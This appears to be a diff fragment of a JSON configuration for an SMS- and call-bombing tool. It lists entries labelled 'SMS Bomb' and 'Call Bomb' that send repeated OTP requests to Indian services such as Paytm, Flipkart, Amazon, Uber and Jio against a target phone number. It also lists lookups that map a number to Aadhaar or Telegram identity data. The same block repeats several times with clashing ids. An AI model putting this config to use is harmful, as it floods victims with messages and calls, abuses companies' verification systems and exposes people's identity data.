+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
